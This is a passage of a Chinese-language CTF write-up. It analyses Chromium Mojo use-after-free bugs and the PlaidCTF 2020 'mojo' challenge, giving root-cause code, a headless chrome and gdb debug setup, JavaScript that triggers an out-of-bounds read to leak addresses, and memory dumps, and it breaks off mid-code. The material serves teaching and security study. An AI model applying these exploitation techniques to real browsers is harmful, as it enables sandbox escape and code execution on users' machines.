class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RenderFrameHostImpl::CreateInstalledAppProvider</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    mojo::PendingReceiver&lt;<span class="built_in">blink</span>::mojom::InstalledAppProvider&gt; receiver)</span> </span>&#123;</span><br><span class="line">  InstalledAppProviderImpl::Create(<span class="keyword">this</span>, <span class="built_in">std</span>::<span class="built_in">move</span>(receiver));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// static</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InstalledAppProviderImpl::Create</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    RenderFrameHost* host,</span></span></span><br><span class="line"><span class="function"><span class="params">    mojo::PendingReceiver&lt;<span class="built_in">blink</span>::mojom::InstalledAppProvider&gt; receiver)</span> </span>&#123;</span><br><span class="line">  mojo::MakeSelfOwnedReceiver(<span class="built_in">std</span>::make_unique&lt;InstalledAppProviderImpl&gt;(host),</span><br><span class="line">                              <span class="built_in">std</span>::<span class="built_in">move</span>(receiver));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参数是RenderFrameHost和一个receiver,这里通过MakeSelfOwnedReceiver函数来创建一个self-owned的receiver，其作为一个独立的object存在，它拥有一个std::unique_ptr指向其绑定的interface implemention，并且在MessagePipe被关闭或者发生一些错误时，负责任的去delete implemention，所以其将一个interface implemention和MessagePipe绑定到了一起，具体实现参考<a href="https://source.chromium.org/chromium/chromium/src/+/master:mojo/public/cpp/bindings/self_owned_receiver.h" target="_blank" rel="noopener">这里</a>。</p><p><strong>这里我们只要知道InstalledAppProviderImpl和message pipe的生命周期绑定即可，只要message pipe还连接，其就一直存在</strong></p><p>另外InstalledAppProviderImpl里保存一个<code>render_frame_host_</code>对象，其来自传入的<code>render_frame_host</code>指针，但是<strong>并没有通过任何方法来将InstalledAppProviderImpl和RenderFrameHost的生命周期绑定</strong>，一般来说会通过将Impl继承自WebObserver等来观察renderframehost的生命周期，当renderframehost析构的时候会通知Impl做出正确的处理，但这里没有。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">InstalledAppProviderImpl::InstalledAppProviderImpl(</span><br><span class="line">    RenderFrameHost* render_frame_host)</span><br><span class="line">    : render_frame_host_(render_frame_host) &#123;</span><br><span class="line">  DCHECK(render_frame_host_);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">InstalledAppProviderImpl::FilterInstalledApps</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">blink</span>::mojom::RelatedApplicationPtr&gt; related_apps,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> GURL&amp; manifest_url,</span></span></span><br><span class="line"><span class="function"><span class="params">    FilterInstalledAppsCallback callback)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (render_frame_host_-&gt;GetProcess()-&gt;GetBrowserContext()-&gt;IsOffTheRecord()) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">move</span>(callback).Run(<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">blink</span>::mojom::RelatedApplicationPtr&gt;());</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们可以通过free iframe来释放掉对应的render_frame_host，而此时InstalledAppProviderImpl的实例依然存在，再通过FilterInstalledApps来再次use <code>render_frame_host_</code>,而<code>render_frame_host_-&gt;GetProcess()</code>是一个虚函数调用，通过占位render_frame_host来伪造虚函数表，我们就可以任意代码执行。</p><h2 id="plaidctf2020-mojo-writeup"><a href="#plaidctf2020-mojo-writeup" class="headerlink" title="plaidctf2020 mojo writeup"></a>plaidctf2020 mojo writeup</h2><h3 id="root-cause-analysis"><a href="#root-cause-analysis" class="headerlink" title="root cause analysis"></a>root cause analysis</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// static</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PlaidStoreImpl::Create</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    RenderFrameHost *render_frame_host,</span></span></span><br><span class="line"><span class="function"><span class="params">    mojo::PendingReceiver&lt;<span class="built_in">blink</span>::mojom::PlaidStore&gt; receiver)</span> </span>&#123;</span><br><span class="line">  mojo::MakeSelfOwnedReceiver(<span class="built_in">std</span>::make_unique&lt;PlaidStoreImpl&gt;(render_frame_host),<span class="comment">// note lifetime</span></span><br><span class="line">                              <span class="built_in">std</span>::<span class="built_in">move</span>(receiver));</span><br><span class="line">&#125;</span><br><span class="line">..</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PlaidStoreImpl</span> :</span> <span class="keyword">public</span> <span class="built_in">blink</span>::mojom::PlaidStore &#123;</span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">PlaidStoreImpl</span><span class="params">(RenderFrameHost *render_frame_host)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Create</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">      RenderFrameHost* render_frame_host,</span></span></span><br><span class="line"><span class="function"><span class="params">      mojo::PendingReceiver&lt;<span class="built_in">blink</span>::mojom::PlaidStore&gt; receiver)</span></span>;</span><br><span class="line"></span><br><span class="line">  ~PlaidStoreImpl() <span class="keyword">override</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// PlaidStore overrides:</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">StoreData</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;key,</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">uint8_t</span>&gt; &amp;data)</span> <span class="keyword">override</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">GetData</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;key,</span></span></span><br><span class="line"><span class="function"><span class="params">      <span class="keyword">uint32_t</span> count,</span></span></span><br><span class="line"><span class="function"><span class="params">      GetDataCallback callback)</span> <span class="keyword">override</span></span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  RenderFrameHost* render_frame_host_;<span class="comment">//----&gt; can free</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">map</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>, <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">uint8_t</span>&gt; &gt; data_store_;</span><br><span class="line">&#125;;</span><br><span class="line">..</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PlaidStoreImpl::StoreData</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;key,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">uint8_t</span>&gt; &amp;data)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!render_frame_host_-&gt;IsRenderFrameLive()) &#123; <span class="comment">// use</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  data_store_[key] = data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PlaidStoreImpl::GetData</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;key,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">uint32_t</span> count,</span></span></span><br><span class="line"><span class="function"><span class="params">    GetDataCallback callback)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!render_frame_host_-&gt;IsRenderFrameLive()) &#123; <span class="comment">// use</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">move</span>(callback).Run(&#123;&#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">auto</span> it = data_store_.<span class="built_in">find</span>(key);</span><br><span class="line">  <span class="keyword">if</span> (it == data_store_.<span class="built_in">end</span>()) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">move</span>(callback).Run(&#123;&#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">uint8_t</span>&gt; <span class="title">result</span><span class="params">(it-&gt;second.<span class="built_in">begin</span>(), it-&gt;second.<span class="built_in">begin</span>() + count)</span></span>;<span class="comment">//oob</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">move</span>(callback).Run(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">interface PlaidStore &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; Stores data in the data store</span><br><span class="line">  StoreData(string key, array&lt;uint8&gt; data);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; Gets data from the data store</span><br><span class="line">  GetData(string key, uint32 count) &#x3D;&gt; (array&lt;uint8&gt; data);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这个题目里有两个漏洞</p><ul><li>UAF</li></ul><p>这个题目里的UAF和我们上面分析的那个case如出一辙，都是同样的生命周期管理的问题，由于MakeSelfOwnedReceiver将PlaidStoreImpl实例和message pipe关联在一起，只要不断开则PlaidStoreImpl实例不会被析构。</p><p>而PlaidStoreImpl类保存了指向其所在render_frame_host的raw pointer，即<code>render_frame_host_</code>，但是并没有将它们的生命周期绑定，即render_frame_host被析构，但PlaidStoreImpl实例仍然可以存在。</p><p>于是就可以通过在主frame里创建一个child iframe，然后在child iframe里将message pipe的remote端传给父frame，然后将child iframe从dom里移除，从而析构掉child iframe其对应的render_frame_host，但由于message pipe被传给了父frame，因此不会被断开，而此时render_frame_host已经被析构掉了。</p><p>所以我们可以通过父frame来通过child iframe里传过来的message pipe的remote端，来调用其StoreData/GetData触发UAF。</p><ul><li>OOB<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PlaidStoreImpl::GetData</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;key,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">uint32_t</span> count,</span></span></span><br><span class="line"><span class="function"><span class="params">    GetDataCallback callback)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!render_frame_host_-&gt;IsRenderFrameLive()) &#123; <span class="comment">// use</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">move</span>(callback).Run(&#123;&#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">auto</span> it = data_store_.<span class="built_in">find</span>(key);</span><br><span class="line">  <span class="keyword">if</span> (it == data_store_.<span class="built_in">end</span>()) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">move</span>(callback).Run(&#123;&#125;);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">uint8_t</span>&gt; <span class="title">result</span><span class="params">(it-&gt;second.<span class="built_in">begin</span>(), it-&gt;second.<span class="built_in">begin</span>() + count)</span></span>;<span class="comment">//oob</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">move</span>(callback).Run(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>可以看出并没有约束count的大小，所以我们可以通过getData来越界读并返回读取的结果。</li></ul><h3 id="debug"><a href="#debug" class="headerlink" title="debug"></a>debug</h3><ul><li>解压mojo题，在本地开启一个server<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~&#x2F;mojo$ ls</span><br><span class="line">cc                      Dockerfile    mojo_js.zip      third_party</span><br><span class="line">chrome                  extensions    plaidstore.diff  trigger.html</span><br><span class="line">chrome_100_percent.pak  flag_printer  resources.pak    ui</span><br><span class="line">chrome_200_percent.pak  gpu           run.sh           url</span><br><span class="line">chrome.zip              icudtl.dat    server.py        v8_context_snapshot.bin</span><br><span class="line">components              ipc           services         visit.sh</span><br><span class="line">content                 locales       skia</span><br><span class="line">device                  media         storage</span><br><span class="line">devtools                mojo          swiftshader</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">sakura@ubuntu:~&#x2F;mojo$ python3 -m http.serverServing HTTP on 0.0.0.0 port 8000 ...</span><br><span class="line">127.0.0.1 - - [20&#x2F;Sep&#x2F;2020 08:37:21] &quot;GET &#x2F;trigger.html HTTP&#x2F;1.1&quot; 200 -</span><br><span class="line">127.0.0.1 - - [20&#x2F;Sep&#x2F;2020 09:36:21] &quot;GET &#x2F;trigger.html HTTP&#x2F;1.1&quot; 200 -</span><br><span class="line">127.0.0.1 - - [20&#x2F;Sep&#x2F;2020 09:36:28] &quot;GET &#x2F;trigger.html HTTP&#x2F;1.1&quot; 200 -</span><br></pre></td></tr></table></figure></li><li>启动chrome<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~&#x2F;mojo$ .&#x2F;chrome --headless --disable-gpu --remote-debugging-port&#x3D;1338 --user-data-dir&#x3D;&#x2F;tmp&#x2F;noexist --enable-blink-features&#x3D;MojoJS,MojoJSTest http:&#x2F;&#x2F;localhost:8000&#x2F;trigger.html</span><br></pre></td></tr></table></figure></li><li>debug启动chrome<br>写一个debug.sh，注意因为我们要调试的是browser进程，所以要跟随parent。<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file ./chrome</span><br><span class="line"><span class="built_in">set</span> args --headless --<span class="built_in">disable</span>-gpu --remote-debugging-port=1338 --user-data-dir=/tmp/noexist --<span class="built_in">enable</span>-blink-features=MojoJS,MojoJSTest http://localhost:8000/trigger.html</span><br><span class="line"><span class="built_in">set</span> follow-fork-mode parent</span><br></pre></td></tr></table></figure>执行<code>gdb -x debug.sh</code></li></ul><h3 id="oob-leak-and-gadget"><a href="#oob-leak-and-gadget" class="headerlink" title="oob leak and gadget"></a>oob leak and gadget</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">oob</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"oob"</span>);</span><br><span class="line">    <span class="keyword">var</span> pipe = Mojo.createMessagePipe();</span><br><span class="line">    Mojo.bindInterface(blink.mojom.PlaidStore.name,</span><br><span class="line">    pipe.handle1, <span class="string">"context"</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">var</span> plaid_store_ptr = <span class="keyword">new</span> blink.mojom.PlaidStorePtr(pipe.handle0);</span><br><span class="line">    <span class="keyword">await</span> plaid_store_ptr.storeData(<span class="string">"aaa"</span>, [<span class="number">0x31</span>,<span class="number">0x32</span>,<span class="number">0x33</span>,<span class="number">0x34</span>,<span class="number">0x35</span>,<span class="number">0x36</span>,<span class="number">0x37</span>,<span class="number">0x38</span>,<span class="number">0x41</span>,<span class="number">0x42</span>,<span class="number">0x43</span>,<span class="number">0x44</span>,<span class="number">0x45</span>,<span class="number">0x46</span>,<span class="number">0x47</span>,<span class="number">0x48</span>]);</span><br><span class="line">    oob_data = <span class="keyword">await</span> plaid_store_ptr.getData(<span class="string">"aaa"</span>,<span class="number">0x20</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(hex(b2i(oob_data.data.slice(<span class="number">0x10</span>,<span class="number">0x18</span>))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[0920&#x2F;093628.390634:INFO:CONSOLE(178)] &quot;oob&quot;, source: http:&#x2F;&#x2F;localhost:8000&#x2F;trigger.html (178)</span><br><span class="line">[0920&#x2F;093628.430111:INFO:CONSOLE(186)] &quot;0x55ab6560a8b0&quot;, source: http:&#x2F;&#x2F;localhost:8000&#x2F;trigger.html (186)</span><br></pre></td></tr></table></figure><p>可以看出我们leak出了一个很像地址的东西，那么我们可以调试一下我们到底可以越界读取到什么</p><ul><li>首先我们可以看看创建PlaidStoreImpl的函数，并下一个断点，我们可以<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ info functions PlaidStoreImpl</span><br><span class="line">All functions matching regular expression &quot;PlaidStoreImpl&quot;:</span><br><span class="line">Non-debugging symbols:</span><br><span class="line">0x0000000003c58170  content::PlaidStoreImpl::~PlaidStoreImpl()</span><br><span class="line">0x0000000003c58170  content::PlaidStoreImpl::~PlaidStoreImpl()</span><br><span class="line">0x0000000003c58190  content::PlaidStoreImpl::~PlaidStoreImpl()</span><br><span class="line">0x0000000003c581c0  content::PlaidStoreImpl::StoreData(std::__1::basic_string&lt;char, std::__1::char_traits&lt;char&gt;, std::__1::allocator&lt;char&gt; &gt; const&amp;, std::__1::vector&lt;unsigned char, std::__1::allocator&lt;unsigned char&gt; &gt; const&amp;)</span><br><span class="line">0x0000000003c582b0  content::PlaidStoreImpl::GetData(std::__1::basic_string&lt;char, std::__1::char_traits&lt;char&gt;, std::__1::allocator&lt;char&gt; &gt; const&amp;, unsigned int, base::OnceCallback&lt;void (std::__1::vector&lt;unsigned char, std::__1::allocator&lt;unsigned char&gt; &gt; const&amp;)&gt;)</span><br><span class="line">0x0000000003c58490  content::PlaidStoreImpl::Create(content::RenderFrameHost*, mojo::PendingReceiver&lt;blink::mojom::PlaidStore&gt;)</span><br><span class="line">0x0000000003c58550  base::WeakPtr&lt;mojo::StrongBinding&lt;blink::mojom::PlaidStore&gt; &gt; mojo::MakeSelfOwnedReceiver&lt;blink::mojom::PlaidStore, content::PlaidStoreImpl&gt;(std::__1::unique_ptr&lt;content::PlaidStoreImpl, std::__1::default_delete&lt;content::PlaidStoreImpl&gt; &gt;, mojo::PendingReceiver&lt;blink::mojom::PlaidStore&gt;, scoped_refptr&lt;base::SequencedTaskRunner&gt;)</span><br><span class="line">...</span><br><span class="line">(gdb) b content::PlaidStoreImpl::Create</span><br><span class="line">Breakpoint 1 at 0x3c58494</span><br><span class="line">(gdb) r</span><br><span class="line">...</span><br><span class="line">&#x3D;&gt; 0x5555591ac494 &lt;plaid_store_ptrPlaidStoreEEE+4&gt;:push   r15</span><br><span class="line">   0x5555591ac496 &lt;plaid_store_ptrPlaidStoreEEE+6&gt;:push   r14</span><br><span class="line">   0x5555591ac498 &lt;plaid_store_ptrPlaidStoreEEE+8&gt;:push   rbx</span><br><span class="line">   0x5555591ac499 &lt;plaid_store_ptrPlaidStoreEEE+9&gt;:sub    rsp,0x38</span><br><span class="line">   0x5555591ac49d &lt;plaid_store_ptrPlaidStoreEEE+13&gt;:mov    r14,rsi</span><br><span class="line">   0x5555591ac4a0 &lt;plaid_store_ptrPlaidStoreEEE+16&gt;:mov    rbx,rdi</span><br><span class="line">   0x5555591ac4a3 &lt;plaid_store_ptrPlaidStoreEEE+19&gt;:mov    edi,0x28 &#x2F;&#x2F;从这里可以看出impl的大小是0x28</span><br><span class="line">   0x5555591ac4a8 &lt;plaid_store_ptrPlaidStoreEEE+24&gt;:</span><br><span class="line">    call   0x55555ac584b0 &lt;_ZnwmRKSt9nothrow_t&gt; &#x2F;&#x2F;operator new(unsigned long, std::nothrow_t const&amp;),注意这条语句执行完了之后的rax就是impl的地址，所以我会在知道了这个地址之后，直接finish这个函数，然后看最终的对象布局。</span><br><span class="line">   0x5555591ac4ad &lt;plaid_store_ptrPlaidStoreEEE+29&gt;:</span><br><span class="line">    lea    rcx,[rip+0x635e2ec]        # 0x55555f50a7a0 &lt;_ZTVN7content14PlaidStoreImplE+16&gt; &#x2F;&#x2F;vtable for content::PlaidStoreImpl</span><br><span class="line">   0x5555591ac4b4 &lt;plaid_store_ptrPlaidStoreEEE+36&gt;:mov    QWORD PTR [rax],rcx</span><br><span class="line">   0x5555591ac4b7 &lt;plaid_store_ptrPlaidStoreEEE+39&gt;:</span><br><span class="line">    mov    QWORD PTR [rax+0x8],rbx</span><br><span class="line">   0x5555591ac4bb &lt;plaid_store_ptrPlaidStoreEEE+43&gt;:lea    rcx,[rax+0x18]</span><br><span class="line">   0x5555591ac4bf &lt;plaid_store_ptrPlaidStoreEEE+47&gt;:xorps  xmm0,xmm0</span><br><span class="line">   0x5555591ac4c2 &lt;plaid_store_ptrPlaidStoreEEE+50&gt;:</span><br><span class="line">    movups XMMWORD PTR [rax+0x18],xmm0</span><br><span class="line">   0x5555591ac4c6 &lt;_ZN7content14PlaidStoreImpl6Crea</span><br><span class="line">...</span><br><span class="line">&#x2F;&#x2F;在执行了call指令之后，返回的rax的值，就是plaidstoreimpl的地址</span><br><span class="line">gdb-peda$ x&#x2F;20gx 0x2dd26ed2ede0</span><br><span class="line">0x2dd26ed2ede0:0x000055555f50a7a0 &#x2F;&#x2F;vtable0x00002dd26ec42400 &#x2F;&#x2F; render_frame_host_</span><br><span class="line">0x2dd26ed2edf0:|map start| 0x00002dd26ed2edf8 0x0000000000000000</span><br><span class="line">0x2dd26ed2ee00:0x0000000000000000|map end| --&gt; &#x2F;&#x2F; data_store_</span><br></pre></td></tr></table></figure></li><li>然后我们执行到storeData结束，看看此时data_store_这个map是怎么保存数据的。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x&#x2F;20gx 0x00002dd26ed33870 &#x2F;&#x2F;data_store_</span><br><span class="line">0x2dd26ed33870:0x00000000000000000x0000000000000000</span><br><span class="line">0x2dd26ed33880:0x00002dd26ed2edf80x000055555aba0101</span><br><span class="line">0x2dd26ed33890:0x0000000000616161&#x2F;&#x2F;key10x0000000000000000</span><br><span class="line">0x2dd26ed338a0:0x03000000000000000x00002dd26ed2f0b0&#x2F;&#x2F;value1</span><br><span class="line">0x2dd26ed338b0:0x00002dd26ed2f0c00x00002dd26ed2f0c0</span><br><span class="line">0x2dd26ed338c0:0xffffd22f000000010x0000000000000000</span><br><span class="line">0x2dd26ed338d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x2dd26ed338e0:0x00000000000000000x0000000000000000</span><br><span class="line">0x2dd26ed338f0:0x00002dd26ed000000x00002dd26ec1c0c0</span><br><span class="line">0x2dd26ed33900:0x00002dd26ec1c0c00x0000000000000001</span><br><span class="line">gdb-peda$ x&#x2F;20gx 0x00002dd26ed2f0b0</span><br><span class="line">0x2dd26ed2f0b0:0x38373635343332310x4847464544434241</span><br><span class="line">0x2dd26ed2f0c0:0xffffd200000000010xfffffffd55553ec2</span><br><span class="line">0x2dd26ed2f0d0:0xffffd200000000010xfffffffd55553ec2</span><br><span class="line">0x2dd26ed2f0e0:0xffffd200000000010xfffffffd55553ec2</span><br><span class="line">0x2dd26ed2f0f0:0xffffd200000000010xfffffffd55553ec2</span><br></pre></td></tr></table></figure>为了继续往下，我需要简要的描述一下map的内存布局,chrome里使用的std::map标准库实现在<a href="https://source.chromium.org/chromium/chromium/src/+/master:buildtools/third_party/libc++/trunk/include/map" target="_blank" rel="noopener">这里</a><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> _<span class="title">Key</span>, <span class="title">class</span> _<span class="title">CP</span>, <span class="title">class</span> _<span class="title">Compare</span>,</span></span><br><span class="line"><span class="class">          <span class="title">bool</span> = <span class="title">is_empty</span>&lt;_Compare&gt;:</span>:value &amp;&amp; !__libcpp_is_final&lt;_Compare&gt;::value&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> __<span class="title">map_value_compare</span></span></span><br><span class="line"><span class="class">    :</span> <span class="keyword">private</span> _Compare</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">...</span><br><span class="line">    <span class="keyword">typedef</span> __tree&lt;__value_type, __vc, __allocator_type&gt;   __base;</span><br><span class="line">    __base __tree_;</span><br><span 